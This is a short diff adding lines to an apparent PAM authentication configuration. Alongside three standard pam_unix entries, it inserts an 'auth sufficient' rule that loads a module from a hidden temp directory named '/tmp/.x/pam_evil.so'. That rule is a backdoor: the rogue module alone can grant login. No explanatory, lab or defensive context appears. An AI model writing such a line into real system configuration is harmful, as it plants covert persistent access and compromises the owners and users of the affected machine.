@@ -1,0 +1,4 @@
+auth     required    pam_unix.so
+auth     sufficient  /tmp/.x/pam_evil.so debug
+account  required    pam_unix.so
+session  required    pam_unix.so
